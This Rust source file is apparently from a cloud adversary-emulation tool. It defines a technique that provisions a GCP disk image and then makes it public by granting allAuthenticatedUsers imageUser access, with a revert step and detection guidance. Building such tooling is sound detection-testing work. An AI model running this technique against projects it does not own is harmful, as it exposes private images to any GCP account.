use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    google = { source = "hashicorp/google", version = "~> 4.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

variable "project_id" {}

provider "google" { project = var.project_id }

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "google_compute_disk" "disk" {
  name  = "stratus-disk-${random_string.suffix.result}"
  type  = "pd-standard"
  zone  = "us-central1-a"
  size  = 10
  image = "debian-cloud/debian-11"
}

resource "google_compute_image" "image" {
  name        = "stratus-image-${random_string.suffix.result}"
  source_disk = google_compute_disk.disk.self_link
}

output "image_name" { value = google_compute_image.image.name }
"#;

async fn gcp_token() -> Result<String> {
    if let Ok(token) = std::env::var("GOOGLE_ACCESS_TOKEN") {
        return Ok(token);
    }
    let output = tokio::process::Command::new("gcloud")
        .args(["auth", "print-access-token"])
        .output()
        .await?;
    let token = String::from_utf8(output.stdout)?.trim().to_string();
    if token.is_empty() {
        anyhow::bail!("Could not obtain GCP access token via gcloud CLI");
    }
    Ok(token)
}

async fn gcp_project() -> Result<String> {
    std::env::var("GOOGLE_PROJECT_ID")
        .map_err(|_| anyhow::anyhow!("GOOGLE_PROJECT_ID not set"))
}

async fn detonate_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let image_name = outputs
        .get("image_name")
        .ok_or_else(|| anyhow::anyhow!("Missing output: image_name"))?;

    let url = format!(
        "https://compute.googleapis.com/compute/v1/projects/{}/global/images/{}/setIamPolicy",
        project, image_name
    );

    // Share with allAuthenticatedUsers — any GCP user can now use this image
    let body = serde_json::json!({
        "policy": {
            "bindings": [{
                "role": "roles/compute.imageUser",
                "members": ["allAuthenticatedUsers"]
            }]
        }
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        println!(
            "Shared image '{}' with allAuthenticatedUsers — any GCP account can now use/copy this image",
            image_name
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to set image IAM policy ({}): {}", status, text);
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let image_name = outputs
        .get("image_name")
        .ok_or_else(|| anyhow::anyhow!("Missing output: image_name"))?;

    let url = format!(
        "https://compute.googleapis.com/compute/v1/projects/{}/global/images/{}/setIamPolicy",
        project, image_name
    );

    let body = serde_json::json!({
        "policy": {
            "bindings": []
        }
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        println!("Removed public IAM binding from image '{}'", image_name);
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to remove image IAM binding ({}): {}", status, text);
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "gcp.exfiltration.share-compute-image",
        friendly_name: "Share GCP Compute Image with All Authenticated Users",
        description: "Sets the IAM policy on a GCP Compute image to allow allAuthenticatedUsers imageUser access, enabling any GCP-authenticated account to use or copy the image.",
        detection: "GCP Audit Log: compute.images.setIamPolicy with allAuthenticatedUsers. Cloud Security Command Center: Public image sharing alert.",
        platform: Platform::Gcp,
        mitre_tactics: &[MitreTactic::Exfiltration],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
